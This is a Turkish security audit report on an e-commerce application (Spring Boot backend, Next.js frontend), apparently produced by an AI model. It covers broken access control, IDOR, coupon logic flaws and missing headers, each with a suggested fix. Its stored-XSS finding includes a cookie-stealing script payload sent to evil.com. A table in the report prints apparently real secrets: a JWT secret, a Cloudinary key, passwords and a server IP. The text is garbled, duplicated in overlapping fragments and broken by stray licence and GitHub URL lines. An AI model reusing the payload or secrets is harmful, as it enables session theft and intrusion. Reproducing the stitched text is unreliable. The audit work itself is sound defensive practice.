**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: unknown
https://github.com/hans2103/HKweb/blob/d7d731a35e32743672844f2f2870966ab936e4ca/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        ],
    }];
}
```


## License: unknown
https://github.com/praveenjuge/praveenjuge/blob/f7c607592efe59257f18e3337868dd9519bec159/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
